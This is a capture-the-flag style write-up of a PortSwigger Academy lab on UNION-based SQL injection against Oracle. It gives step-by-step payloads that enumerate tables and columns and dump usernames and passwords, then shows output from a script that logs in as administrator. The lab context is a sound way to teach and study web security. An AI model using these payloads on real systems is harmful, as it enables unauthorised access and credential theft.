# Equivalent to information schema on Oracle

On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying `all_tables`:

`SELECT * FROM all_tables`

And you can list columns by querying `all_tab_columns`:

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

# Lab: SQL injection attack, listing the database contents on Oracle

This lab contains an  [SQL injection](https://portswigger.net/web-security/sql-injection)  vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the  `administrator`  user.

#### Hint

On Oracle databases, every  `SELECT`  statement must specify a table to select  `FROM`. If your  `UNION SELECT`  attack does not query from a table, you will still need to include the  `FROM`  keyword followed by a valid table name.

There is a built-in table on Oracle called  `dual`  which you can use for this purpose. For example:  `UNION SELECT 'abc' FROM dual`

For more information, see our  [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

# PoC

1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
2.  Determine the  [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)  and  [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the  `category`  parameter:
    - `'+UNION+SELECT+'abc','def'+FROM+dual--`
    -`' ORDER BY 2--`
    - `' UNION SELECT 'test', 'test' FROM dual--`
3.  Use the following payload to retrieve the list of tables in the database:
    
    `' UNION SELECT NULL, table_name FROM all_tables--`
4.  Find the name of the table containing user credentials.
5.  Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'USERS_LAHPFP'--`
6.  Find the names of the columns containing usernames and passwords.
7.  Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `' UNION SELECT USERNAME_BYWSYB, PASSWORD_KBCUUL FROM USERS_LAHPFP--`
8.  Find the password for the  `administrator`  user, and use it to log in.

```bash
$ python3 sqli_lab_10.py "https://ac811fe11f1dcc30c0d839f300c60030.web-security-academy.net"

    >> SQL injection attack, listing the database contents on Oracle
    >> by Port Swigger Academy

[*] Looking for a users table...
[✓] Found the users table name: USERS_BKGSWO 
[✓] Found the username column name: USERNAME_JQEWWS
[✓] Found the password column name: PASSWORD_PXBWWI
[✓] The administrator password is: 5g14mfdpotluklcj2in7
[*] Try to login as an Administrator...
[✓] We have logged as an Administrator!
```